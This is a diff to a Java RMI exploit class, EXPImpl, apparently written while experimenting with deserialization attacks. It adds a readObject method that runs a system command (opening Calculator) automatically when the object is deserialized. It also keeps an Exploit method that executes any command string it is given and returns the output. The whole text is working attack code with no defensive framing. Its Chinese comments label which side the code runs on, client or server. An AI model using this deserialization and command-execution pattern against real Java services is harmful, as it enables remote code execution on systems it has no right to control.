@@ -9,7 +9,7 @@ public class EXPImpl extends UnicastRemoteObject implements EXP,Serializable {
     protected EXPImpl() throws RemoteException {}
 
     /*
-    //defineclass自动执行
+    //defineclass自动执行----Server
     static {
         Process p;
         String result="";
@@ -32,11 +32,13 @@ public class EXPImpl extends UnicastRemoteObject implements EXP,Serializable {
     }
     */
 
-    //反序列化自动执行
+    //反序列化自动执行----Client
     private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
+        Runtime.getRuntime().exec("open /System/Applications/Calculator.app");
         System.out.println("ysoserial?");
     }
 
+    //函数调用----Server执行并将实例序列化发送给Client
     @Override
     public String Exploit(String cmd) throws IOException {
 
@@ -53,7 +55,8 @@ public class EXPImpl extends UnicastRemoteObject implements EXP,Serializable {
         while((disr=bufferedReader.readLine())!=null){
             result += disr + "\n";
         }
-        return result;//return to client
+        //return to client
+        return result;
     }
 
 }
